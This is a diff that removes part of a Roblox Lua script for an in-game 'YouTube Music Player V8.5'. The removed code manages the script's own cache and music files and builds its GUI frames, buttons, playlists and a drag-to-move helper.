-Have a good game and enjoy!]])
-end
-
-if not isfile("YouTube Music Player/Internal/Cache/ABOUT CACHE.txt") then
-	writefile("YouTube Music Player/Internal/Cache/ABOUT CACHE.txt", [[[YouTube Music Player Cache]
-
-This folder is used to temporarily store images to help things load faster.
-
-All files here will be cleared the first time you execute the script.
-
-You can ignore everything here without any problem! :D]])
-end
-
-if isfile("YouTube Music Player/[YMP] README.txt") then
-	delfile("YouTube Music Player/[YMP] README.txt")
-end
-
-for _, v17 in ipairs(listfiles("YouTube Music Player/Internal/Cache")) do
-	if not string.find(v17, "ABOUT CACHE.txt") then
-		delfile(v17)
-	end
-end
-
-if isfile("YouTube Music Player/Musics/TAn5b0_j64s.mp3") then
-	delfile("YouTube Music Player/Musics/TAn5b0_j64s.mp3")
-end
-
-pcall(function()
-	if not isfile("YouTube Music Player/Musics/LvvrO6JifEA.mp3") then
-		writefile("YouTube Music Player/Musics/LvvrO6JifEA.mp3", game:HttpGet("https://github.com/Dan41/Roblox-Scripts/raw/refs/heads/main/Youtube%20Music%20Player/Welcome.mp3"))
-	end
-end)
-
-Corner = function(parent, arg, arg2)
-	local uiCorner = Instance.new("UICorner")
-
-	if arg2 == nil then
-		uiCorner.CornerRadius = UDim.new(0, arg)
-	else
-		uiCorner.CornerRadius = UDim.new(arg, arg2)
-	end
-
-	uiCorner.Parent = parent
-end
-
-Stroke = function(parent, arg, arg2, arg3, thickness, transparency)
-	local uiStroke = parent:FindFirstChildOfClass("UIStroke")
-
-	if not uiStroke then
-		uiStroke = Instance.new("UIStroke")
-		uiStroke.Parent = parent
-	end
-
-	uiStroke.Color = Color3.fromRGB(arg, arg2, arg3)
-	uiStroke.Thickness = thickness
-
-	if transparency ~= nil then
-		uiStroke.Transparency = transparency
-	end
-end
-
-Draggable = function(arg, arg2)
-	if not arg or not arg:IsA("GuiObject") then
-		return
-	end
-	local flag19 = false
-	local v17 = nil
-	local position = nil
-	local position2 = nil
-	local n4 = 2
-	arg:SetAttribute("Blocked", false)
-	arg:SetAttribute("Moved", false)
-
-	local function fn4(arg3)
-		local n5 = arg3.Position - position
-
-		if not arg:GetAttribute("Moved") and n5.Magnitude > n4 then
-			arg:SetAttribute("Moved", true)
-		end
-
-		local n6 = position2.X.Offset + n5.X
-		local n7 = position2.Y.Offset + n5.Y
-
-		if arg2 then
-			local screenGui3 = arg:FindFirstAncestorWhichIsA("ScreenGui")
-
-			if screenGui3 then
-				local absoluteSize = screenGui3.AbsoluteSize
-				local absoluteSize2 = arg.AbsoluteSize
-				local anchorPoint = arg.AnchorPoint
-				local uiStroke = arg:FindFirstChildWhichIsA("UIStroke")
-				local enabled = uiStroke and uiStroke.Enabled
-				local n8 = 0
-
-				if enabled then
-					n8 = uiStroke.Thickness
-				end
-
-				local n9 = -position2.Y.Scale * absoluteSize.Y + anchorPoint.Y * absoluteSize2.Y + n8
-				local n10 = (1 - position2.Y.Scale) * absoluteSize.Y - (1 - anchorPoint.Y) * absoluteSize2.Y - n8
-				n6 = math.clamp(n6, -position2.X.Scale * absoluteSize.X + anchorPoint.X * absoluteSize2.X + n8, (1 - position2.X.Scale) * absoluteSize.X - (1 - anchorPoint.X) * absoluteSize2.X - n8)
-				n7 = math.clamp(n7, n9, n10)
-			end
-		end
-
-		arg.Position = UDim2.new(position2.X.Scale, n6, position2.Y.Scale, n7)
-	end
-
-	arg.InputBegan:Connect(function(input)
-		if flag19 then
-			return
-		end
-
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			flag19 = true
-			v17 = input
-			position = input.Position
-			position2 = arg.Position
-			arg:SetAttribute("Blocked", true)
-			arg:SetAttribute("Moved", false)
-			local connection = nil
-
-			connection = input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					flag19 = false
-					v17 = nil
-					arg:SetAttribute("Blocked", false)
-					connection:Disconnect()
-				end
-			end)
-		end
-	end)
-
-	arg.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			if not v17 then
-				v17 = input
-			end
-		end
-	end)
-
-	v9.InputChanged:Connect(function(input)
-		if flag19 and input == v17 then
-			fn4(input)
-		end
-	end)
-end
-
-local frame = Instance.new("Frame")
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.Size = UDim2.new(0, 587, 0, 300)
-frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.BackgroundTransparency = 0
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Visible = false
-frame.Parent = screenGui
-local imageButton = Instance.new("ImageButton")
-imageButton.Size = UDim2.new(0, 50, 0, 50)
-imageButton.AnchorPoint = Vector2.new(0.5, 0)
-imageButton.Position = UDim2.new(0.5, 0, 0, 20)
-imageButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-imageButton.Image = "rbxassetid://83758613781843"
-imageButton.Visible = false
-imageButton.Parent = screenGui
-ContadorJA = Instance.new("Frame")
-ContadorJA.Size = UDim2.new(0, 17, 0, 17)
-ContadorJA.Position = UDim2.new(0, 36, 0, -3)
-ContadorJA.BackgroundColor3 = Color3.fromRGB(250, 92, 92)
-ContadorJA.Visible = false
-ContadorJA.Parent = imageButton
-ContadorJANU = Instance.new("TextLabel")
-ContadorJANU.Size = UDim2.new(0, 15, 0, 15)
-ContadorJANU.Position = UDim2.new(0, 1, 0, 1)
-ContadorJANU.BackgroundTransparency = 1
-ContadorJANU.Text = "0"
-ContadorJANU.TextColor3 = Color3.fromRGB(0, 0, 0)
-ContadorJANU.TextScaled = true
-ContadorJANU.Parent = ContadorJA
-Draggable(imageButton, true)
-Draggable(frame)
-Mutar = Instance.new("ImageButton")
-Mutar.Size = UDim2.new(0, 30, 0, 30)
-Mutar.Position = UDim2.new(0, 6, 0, 6)
-Mutar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Mutar.Image = "rbxassetid://109518972658686"
-Mutar.Parent = frame
-BotaoFechar = Instance.new("ImageButton")
-BotaoFechar.Size = UDim2.new(0, 30, 0, 30)
-BotaoFechar.Position = UDim2.new(1, -36, 0, 6)
-BotaoFechar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-BotaoFechar.Parent = frame
-X = Instance.new("ImageLabel")
-X.AnchorPoint = Vector2.new(0.5, 0.5)
-X.Size = UDim2.new(0, 17, 0, 17)
-X.Position = UDim2.new(0.5, 0, 0.5, 0)
-X.BackgroundTransparency = 1
-X.Image = "rbxassetid://119026663645791"
-X.Parent = BotaoFechar
-Titulo = Instance.new("Frame")
-Titulo.Size = UDim2.new(0, 488, 0, 30)
-Titulo.Position = UDim2.new(0, 50, 0, 6)
-Titulo.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Titulo.Parent = frame
-TextoTitulo = Instance.new("TextLabel")
-TextoTitulo.Size = UDim2.new(1, 0, 1, -4)
-TextoTitulo.Position = UDim2.new(0, 0, 0, 2)
-TextoTitulo.BackgroundTransparency = 1
-TextoTitulo.Text = "YouTube Music Player V8.5"
-TextoTitulo.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoTitulo.TextScaled = true
-TextoTitulo.Font = Enum.Font.Highway
-TextoTitulo.Parent = Titulo
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 5)
-Linha.Position = UDim2.new(0, 0, 0, 42)
-Linha.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Linha.BorderSizePixel = 0
-Linha.Parent = frame
-Navegacao = Instance.new("Frame")
-Navegacao.Size = UDim2.new(0, 160, 1, -61)
-Navegacao.Position = UDim2.new(0, 7, 0, 54)
-Navegacao.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Navegacao.BorderSizePixel = 0
-Navegacao.Visible = true
-Navegacao.ClipsDescendants = true
-Navegacao.Parent = frame
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 2)
-Linha.Position = UDim2.new(0, 0, 0, 42)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = Navegacao
-TituloNave = Instance.new("Frame")
-TituloNave.Size = UDim2.new(0, 150, 0, 32)
-TituloNave.Position = UDim2.new(0, 5, 0, 5)
-TituloNave.BackgroundColor3 = Color3.fromRGB(185, 34, 34)
-TituloNave.Parent = Navegacao
-FotoNave = Instance.new("ImageLabel")
-FotoNave.Size = UDim2.new(0, 32, 0, 32)
-FotoNave.Position = UDim2.new(0, 0, 0, 0)
-FotoNave.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FotoNave.BackgroundTransparency = 0.5
-FotoNave.Image = "rbxassetid://123533799129853"
-FotoNave.Parent = TituloNave
-NomeNave = Instance.new("TextLabel")
-NomeNave.Size = UDim2.new(0, 102, 1, 0)
-NomeNave.Position = UDim2.new(0, 37, 0, 0)
-NomeNave.BackgroundTransparency = 1
-NomeNave.Text = Traducao.Navegacao
-NomeNave.TextColor3 = Color3.fromRGB(255, 0, 0)
-NomeNave.Font = Enum.Font.SourceSansBold
-NomeNave.TextScaled = true
-NomeNave.Parent = TituloNave
-BaseSF = Instance.new("Frame")
-BaseSF.Size = UDim2.new(0, 158, 0, 193)
-BaseSF.Position = UDim2.new(0, 1, 0, 45)
-BaseSF.BackgroundTransparency = 1
-BaseSF.BorderSizePixel = 0
-BaseSF.ClipsDescendants = true
-BaseSF.Parent = Navegacao
-ScrollNave = Instance.new("ScrollingFrame")
-ScrollNave.Size = UDim2.new(1, 0, 1, 0)
-ScrollNave.Position = UDim2.new(0, 0, 0, 0)
-ScrollNave.BackgroundTransparency = 1
-ScrollNave.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollNave.ScrollBarImageTransparency = 0.5
-ScrollNave.BorderSizePixel = 0
-ScrollNave.ScrollBarThickness = 1
-ScrollNave.CanvasSize = UDim2.new(0, 0, 0, 271)
-ScrollNave.ScrollingDirection = Enum.ScrollingDirection.Y
-ScrollNave.ClipsDescendants = false
-ScrollNave.Parent = BaseSF
-Botao1 = Instance.new("ImageButton")
-Botao1.Name = "Botao1"
-Botao1.Size = UDim2.new(0, 148, 0, 35)
-Botao1.Position = UDim2.new(0, 5, 0, 5)
-Botao1.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-Botao1.AutoButtonColor = false
-Botao1.Parent = ScrollNave
-Botao2 = Instance.new("ImageButton")
-Botao2.Name = "Botao2"
-Botao2.Size = UDim2.new(0, 148, 0, 35)
-Botao2.Position = UDim2.new(0, 5, 0, 50)
-Botao2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Botao2.AutoButtonColor = false
-Botao2.Parent = ScrollNave
-Botao3 = Instance.new("ImageButton")
-Botao3.Name = "Botao3"
-Botao3.Size = UDim2.new(0, 148, 0, 35)
-Botao3.Position = UDim2.new(0, 5, 0, 95)
-Botao3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Botao3.AutoButtonColor = false
-Botao3.Parent = ScrollNave
-Botao4 = Instance.new("ImageButton")
-Botao4.Name = "Botao4"
-Botao4.Size = UDim2.new(0, 148, 0, 35)
-Botao4.Position = UDim2.new(0, 5, 0, 140)
-Botao4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Botao4.AutoButtonColor = false
-Botao4.Parent = ScrollNave
-Botao5 = Instance.new("ImageButton")
-Botao5.Name = "Botao5"
-Botao5.Size = UDim2.new(0, 148, 0, 35)
-Botao5.Position = UDim2.new(0, 5, 0, 185)
-Botao5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Botao5.BackgroundTransparency = 0.9
-Botao5.AutoButtonColor = false
-Botao5.Parent = ScrollNave
-Botao6 = Instance.new("ImageButton")
-Botao6.Name = "Botao6"
-Botao6.Size = UDim2.new(0, 148, 0, 35)
-Botao6.Position = UDim2.new(0, 5, 0, 230)
-Botao6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Botao6.AutoButtonColor = false
-Botao6.Parent = ScrollNave
-Icone1 = Instance.new("ImageLabel")
-Icone1.Size = UDim2.new(0, 35, 0, 35)
-Icone1.Position = UDim2.new(0, 0, 0, 0)
-Icone1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Icone1.Image = "rbxassetid://107770126918811"
-Icone1.Parent = Botao1
-Icone2 = Instance.new("ImageLabel")
-Icone2.Size = UDim2.new(0, 35, 0, 35)
-Icone2.Position = UDim2.new(0, 0, 0, 0)
-Icone2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Icone2.Image = "rbxassetid://79505391139157"
-Icone2.Parent = Botao2
-Icone3 = Instance.new("ImageLabel")
-Icone3.Size = UDim2.new(0, 35, 0, 35)
-Icone3.Position = UDim2.new(0, 0, 0, 0)
-Icone3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Icone3.Image = "rbxassetid://116645068635461"
-Icone3.Parent = Botao3
-Icone4 = Instance.new("ImageLabel")
-Icone4.Size = UDim2.new(0, 35, 0, 35)
-Icone4.Position = UDim2.new(0, 0, 0, 0)
-Icone4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Icone4.Image = "rbxassetid://71048917954785"
-Icone4.Parent = Botao4
-Icone5 = Instance.new("ImageLabel")
-Icone5.Size = UDim2.new(0, 35, 0, 35)
-Icone5.Position = UDim2.new(0, 0, 0, 0)
-Icone5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Icone5.BackgroundTransparency = 0.9
-Icone5.Image = "rbxassetid://140320771062475"
-Icone5.ImageTransparency = 0.9
-Icone5.Parent = Botao5
-Icone6 = Instance.new("ImageLabel")
-Icone6.Size = UDim2.new(0, 35, 0, 35)
-Icone6.Position = UDim2.new(0, 0, 0, 0)
-Icone6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Icone6.Image = "rbxassetid://75536888881661"
-Icone6.Parent = Botao6
-Nome1 = Instance.new("TextLabel")
-Nome1.Size = UDim2.new(0, 103, 1, 0)
-Nome1.Position = UDim2.new(0, 41, 0, 0)
-Nome1.BackgroundTransparency = 1
-Nome1.Text = "Home"
-Nome1.TextColor3 = Color3.fromRGB(255, 255, 255)
-Nome1.Font = Enum.Font.SourceSansBold
-Nome1.TextScaled = true
-Nome1.Parent = Botao1
-Nome2 = Instance.new("TextLabel")
-Nome2.Size = UDim2.new(0, 103, 1, 0)
-Nome2.Position = UDim2.new(0, 41, 0, 0)
-Nome2.BackgroundTransparency = 1
-Nome2.Text = Traducao.Player
-Nome2.TextColor3 = Color3.fromRGB(255, 255, 255)
-Nome2.Font = Enum.Font.SourceSansBold
-Nome2.TextScaled = true
-Nome2.Parent = Botao2
-Nome3 = Instance.new("TextLabel")
-Nome3.Size = UDim2.new(0, 103, 1, 0)
-Nome3.Position = UDim2.new(0, 41, 0, 0)
-Nome3.BackgroundTransparency = 1
-Nome3.Text = Traducao.Equalizador
-Nome3.TextColor3 = Color3.fromRGB(255, 255, 255)
-Nome3.Font = Enum.Font.SourceSansBold
-Nome3.TextScaled = true
-Nome3.Parent = Botao3
-Nome4 = Instance.new("TextLabel")
-Nome4.Size = UDim2.new(0, 103, 1, 0)
-Nome4.Position = UDim2.new(0, 41, 0, 0)
-Nome4.BackgroundTransparency = 1
-Nome4.Text = Traducao.Add
-Nome4.TextColor3 = Color3.fromRGB(255, 255, 255)
-Nome4.Font = Enum.Font.SourceSansBold
-Nome4.TextScaled = true
-Nome4.Parent = Botao4
-Nome5 = Instance.new("TextLabel")
-Nome5.Size = UDim2.new(0, 103, 1, 0)
-Nome5.Position = UDim2.new(0, 41, 0, 0)
-Nome5.BackgroundTransparency = 1
-Nome5.Text = "Global Chat"
-Nome5.TextColor3 = Color3.fromRGB(20, 20, 20)
-Nome5.Font = Enum.Font.SourceSansBold
-Nome5.TextScaled = true
-Nome5.Parent = Botao5
-Nome6 = Instance.new("TextLabel")
-Nome6.Size = UDim2.new(0, 103, 1, 0)
-Nome6.Position = UDim2.new(0, 41, 0, 0)
-Nome6.BackgroundTransparency = 1
-Nome6.Text = "Premium"
-Nome6.TextColor3 = Color3.fromRGB(255, 255, 153)
-Nome6.Font = Enum.Font.SourceSansBold
-Nome6.TextScaled = true
-Nome6.Parent = Botao6
-ContadorJABO = Instance.new("Frame")
-ContadorJABO.Size = UDim2.new(0, 15, 0, 15)
-ContadorJABO.Position = UDim2.new(0, 0, 0, -3)
-ContadorJABO.BackgroundColor3 = Color3.fromRGB(250, 92, 92)
-ContadorJABO.Visible = false
-ContadorJABO.Parent = Icone5
-ContadorJANUBO = Instance.new("TextLabel")
-ContadorJANUBO.Size = UDim2.new(0, 15, 0, 15)
-ContadorJANUBO.Position = UDim2.new(0, 0, 0, 0)
-ContadorJANUBO.BackgroundTransparency = 1
-ContadorJANUBO.Text = "0"
-ContadorJANUBO.TextColor3 = Color3.fromRGB(0, 0, 0)
-ContadorJANUBO.TextScaled = true
-ContadorJANUBO.Parent = ContadorJABO
-Playlist = Instance.new("Frame")
-Playlist.Size = UDim2.new(0, 160, 1, -61)
-Playlist.Position = UDim2.new(0, 420, 0, 54)
-Playlist.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Playlist.BorderSizePixel = 0
-Playlist.Parent = frame
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 2)
-Linha.Position = UDim2.new(0, 0, 0, 42)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = Playlist
-Linha2 = Instance.new("Frame")
-Linha2.Size = UDim2.new(1, 0, 0, 2)
-Linha2.Position = UDim2.new(0, 0, 0, 195)
-Linha2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha2.BorderSizePixel = 0
-Linha2.Parent = Playlist
-TituloPlayL = Instance.new("Frame")
-TituloPlayL.Size = UDim2.new(0, 150, 0, 32)
-TituloPlayL.Position = UDim2.new(0, 5, 0, 5)
-TituloPlayL.BackgroundColor3 = Color3.fromRGB(185, 34, 34)
-TituloPlayL.Parent = Playlist
-FotoPlayL = Instance.new("ImageLabel")
-FotoPlayL.Size = UDim2.new(0, 32, 0, 32)
-FotoPlayL.Position = UDim2.new(0, 0, 0, 0)
-FotoPlayL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FotoPlayL.BackgroundTransparency = 0.5
-FotoPlayL.Image = "rbxassetid://96966806844504"
-FotoPlayL.Parent = TituloPlayL
-NomePlayL = Instance.new("TextLabel")
-NomePlayL.Size = UDim2.new(0, 102, 1, 0)
-NomePlayL.Position = UDim2.new(0, 37, 0, 0)
-NomePlayL.BackgroundTransparency = 1
-NomePlayL.Text = "Playlist"
-NomePlayL.TextColor3 = Color3.fromRGB(255, 0, 0)
-NomePlayL.Font = Enum.Font.SourceSansBold
-NomePlayL.TextScaled = true
-NomePlayL.Parent = TituloPlayL
-EsquerdaPL = Instance.new("ImageButton")
-EsquerdaPL.Size = UDim2.new(0, 32, 0, 32)
-EsquerdaPL.Position = UDim2.new(0, 6, 0, 202)
-EsquerdaPL.BackgroundColor3 = Color3.fromRGB(237, 76, 66)
-EsquerdaPL.Image = "rbxassetid://121046797518772"
-EsquerdaPL.Parent = Playlist
-DireitaPL = Instance.new("ImageButton")
-DireitaPL.Size = UDim2.new(0, 32, 0, 32)
-DireitaPL.Position = UDim2.new(0, 122, 0, 202)
-DireitaPL.BackgroundColor3 = Color3.fromRGB(237, 76, 66)
-DireitaPL.Image = "rbxassetid://132437763424488"
-DireitaPL.Parent = Playlist
-Vazio = Instance.new("ImageLabel")
-Vazio.Size = UDim2.new(0, 70, 0, 70)
-Vazio.Position = UDim2.new(0, 45, 0, 63)
-Vazio.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Vazio.BackgroundTransparency = 1
-Vazio.Image = "rbxassetid://123712679435265"
-Vazio.Visible = false
-Vazio.Parent = Playlist
-VazioLocal = Instance.new("ImageLabel")
-VazioLocal.Size = UDim2.new(0, 70, 0, 70)
-VazioLocal.Position = UDim2.new(0, 45, 0, 63)
-VazioLocal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-VazioLocal.BackgroundTransparency = 1
-VazioLocal.Image = "rbxassetid://103453753684654"
-VazioLocal.Visible = false
-VazioLocal.Parent = Playlist
-AguardandoPL = Instance.new("ImageLabel")
-AguardandoPL.Size = UDim2.new(0, 70, 0, 70)
-AguardandoPL.Position = UDim2.new(0, 45, 0, 63)
-AguardandoPL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-AguardandoPL.BackgroundTransparency = 1
-AguardandoPL.Image = "rbxassetid://128559285276409"
-AguardandoPL.Visible = false
-AguardandoPL.Parent = Playlist
-SemResultadoPL = Instance.new("ImageLabel")
-SemResultadoPL.Size = UDim2.new(0, 70, 0, 70)
-SemResultadoPL.Position = UDim2.new(0, 45, 0, 63)
-SemResultadoPL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-SemResultadoPL.BackgroundTransparency = 1
-SemResultadoPL.Image = "rbxassetid://109542040841239"
-SemResultadoPL.Visible = false
-SemResultadoPL.Parent = Playlist
-ErroPL = Instance.new("TextLabel")
-ErroPL.Size = UDim2.new(0, 150, 0, 42)
-ErroPL.Position = UDim2.new(0, 5, 0, 149)
-ErroPL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ErroPL.BackgroundTransparency = 0.5
-ErroPL.RichText = true
-ErroPL.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Vazio .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.VazioTexto .. "</font>"
-ErroPL.Font = Enum.Font.SourceSansBold
-ErroPL.TextScaled = true
-ErroPL.Visible = false
-ErroPL.Parent = Playlist
-FrameAbaPL = Instance.new("Frame")
-FrameAbaPL.Size = UDim2.new(0, 70, 0, 32)
-FrameAbaPL.Position = UDim2.new(0, 45, 0, 202)
-FrameAbaPL.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-FrameAbaPL.BackgroundTransparency = 0.5
-FrameAbaPL.Parent = Playlist
-AbaPL = Instance.new("TextLabel")
-AbaPL.Size = UDim2.new(1, -6, 1, -6)
-AbaPL.Position = UDim2.new(0, 3, 0, 3)
-AbaPL.BackgroundTransparency = 1
-AbaPL.Text = Traducao.Todos
-AbaPL.TextColor3 = Color3.fromRGB(255, 0, 0)
-AbaPL.Font = Enum.Font.SourceSansBold
-AbaPL.TextScaled = true
-AbaPL.Visible = true
-AbaPL.Parent = FrameAbaPL
-PesquisaPL = Instance.new("TextBox")
-PesquisaPL.Size = UDim2.new(1, -6, 1, -6)
-PesquisaPL.Position = UDim2.new(0, 3, 0, 3)
-PesquisaPL.BackgroundTransparency = 1
-PesquisaPL.Text = ""
-PesquisaPL.PlaceholderText = Traducao.Search
-PesquisaPL.TextColor3 = Color3.fromRGB(255, 255, 255)
-PesquisaPL.Font = Enum.Font.SourceSansBold
-PesquisaPL.TextScaled = true
-PesquisaPL.TextWrapped = true
-PesquisaPL.Visible = false
-PesquisaPL.Parent = FrameAbaPL
-BaseSF = Instance.new("Frame")
-BaseSF.Size = UDim2.new(0, 158, 0, 149)
-BaseSF.Position = UDim2.new(0, 1, 0, 45)
-BaseSF.BackgroundTransparency = 1
-BaseSF.BorderSizePixel = 0
-BaseSF.ClipsDescendants = true
-BaseSF.Parent = Playlist
-ScrollTodos = Instance.new("ScrollingFrame")
-ScrollTodos.Name = "ScrollTodos"
-ScrollTodos.Size = UDim2.new(1, 0, 1, 0)
-ScrollTodos.Position = UDim2.new(0, 0, 0, 0)
-ScrollTodos.BackgroundTransparency = 1
-ScrollTodos.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollTodos.ScrollBarImageTransparency = 0.5
-ScrollTodos.BorderSizePixel = 0
-ScrollTodos.ScrollBarThickness = 1
-ScrollTodos.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollTodos.CanvasPosition = Vector2.new(0, 0)
-ScrollTodos.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollTodos.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollTodos.Visible = true
-ScrollTodos.Parent = BaseSF
-ScrollMusicas = Instance.new("ScrollingFrame")
-ScrollMusicas.Name = "ScrollMusicas"
-ScrollMusicas.Size = UDim2.new(1, 0, 1, 0)
-ScrollMusicas.Position = UDim2.new(0, 0, 0, 0)
-ScrollMusicas.BackgroundTransparency = 1
-ScrollMusicas.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollMusicas.ScrollBarImageTransparency = 0.5
-ScrollMusicas.BorderSizePixel = 0
-ScrollMusicas.ScrollBarThickness = 1
-ScrollMusicas.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollMusicas.CanvasPosition = Vector2.new(0, 0)
-ScrollMusicas.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollMusicas.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollMusicas.Visible = false
-ScrollMusicas.Parent = BaseSF
-ScrollVideos = Instance.new("ScrollingFrame")
-ScrollVideos.Name = "ScrollVideos"
-ScrollVideos.Size = UDim2.new(1, 0, 1, 0)
-ScrollVideos.Position = UDim2.new(0, 0, 0, 0)
-ScrollVideos.BackgroundTransparency = 1
-ScrollVideos.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollVideos.ScrollBarImageTransparency = 0.5
-ScrollVideos.BorderSizePixel = 0
-ScrollVideos.ScrollBarThickness = 1
-ScrollVideos.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollVideos.CanvasPosition = Vector2.new(0, 0)
-ScrollVideos.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollVideos.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollVideos.Visible = false
-ScrollVideos.Parent = BaseSF
-ScrollRoblox = Instance.new("ScrollingFrame")
-ScrollRoblox.Name = "ScrollRoblox"
-ScrollRoblox.Size = UDim2.new(1, 0, 1, 0)
-ScrollRoblox.Position = UDim2.new(0, 0, 0, 0)
-ScrollRoblox.BackgroundTransparency = 1
-ScrollRoblox.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollRoblox.ScrollBarImageTransparency = 0.5
-ScrollRoblox.BorderSizePixel = 0
-ScrollRoblox.ScrollBarThickness = 1
-ScrollRoblox.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollRoblox.CanvasPosition = Vector2.new(0, 0)
-ScrollRoblox.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollRoblox.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollRoblox.Visible = false
-ScrollRoblox.Parent = BaseSF
-ScrollFav = Instance.new("ScrollingFrame")
-ScrollFav.Name = "ScrollFav"
-ScrollFav.Size = UDim2.new(1, 0, 1, 0)
-ScrollFav.Position = UDim2.new(0, 0, 0, 0)
-ScrollFav.BackgroundTransparency = 1
-ScrollFav.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollFav.ScrollBarImageTransparency = 0.5
-ScrollFav.BorderSizePixel = 0
-ScrollFav.ScrollBarThickness = 1
-ScrollFav.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollFav.CanvasPosition = Vector2.new(0, 0)
-ScrollFav.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollFav.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollFav.Visible = false
-ScrollFav.Parent = BaseSF
-ScrollLocal = Instance.new("ScrollingFrame")
-ScrollLocal.Name = "ScrollLocal"
-ScrollLocal.Size = UDim2.new(1, 0, 1, 0)
-ScrollLocal.Position = UDim2.new(0, 0, 0, 0)
-ScrollLocal.BackgroundTransparency = 1
-ScrollLocal.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollLocal.ScrollBarImageTransparency = 0.5
-ScrollLocal.BorderSizePixel = 0
-ScrollLocal.ScrollBarThickness = 1
-ScrollLocal.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollLocal.CanvasPosition = Vector2.new(0, 0)
-ScrollLocal.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollLocal.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollLocal.Visible = false
-ScrollLocal.Parent = BaseSF
-ScrollPesquisa = Instance.new("ScrollingFrame")
-ScrollPesquisa.Name = "ScrollPesquisa"
-ScrollPesquisa.Size = UDim2.new(1, 0, 1, 0)
-ScrollPesquisa.Position = UDim2.new(0, 0, 0, 0)
-ScrollPesquisa.BackgroundTransparency = 1
-ScrollPesquisa.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollPesquisa.ScrollBarImageTransparency = 0.5
-ScrollPesquisa.BorderSizePixel = 0
-ScrollPesquisa.ScrollBarThickness = 1
-ScrollPesquisa.CanvasSize = UDim2.new(0, 243, 0, 0)
-ScrollPesquisa.CanvasPosition = Vector2.new(0, 0)
-ScrollPesquisa.ElasticBehavior = Enum.ElasticBehavior.Never
-ScrollPesquisa.ScrollingDirection = Enum.ScrollingDirection.XY
-ScrollPesquisa.Visible = false
-ScrollPesquisa.Parent = BaseSF
-Tela1 = Instance.new("Frame")
-Tela1.Size = UDim2.new(0, 247, 0, 251)
-Tela1.Position = UDim2.new(0, 170, 0, 48)
-Tela1.BackgroundTransparency = 1
-Tela1.BorderSizePixel = 0
-Tela1.Visible = true
-Tela1.Parent = frame
-Tela2 = Instance.new("Frame")
-Tela2.Size = UDim2.new(0, 247, 0, 251)
-Tela2.Position = UDim2.new(0, 170, 0, 48)
-Tela2.BackgroundTransparency = 1
-Tela2.BorderSizePixel = 0
-Tela2.Visible = false
-Tela2.Parent = frame
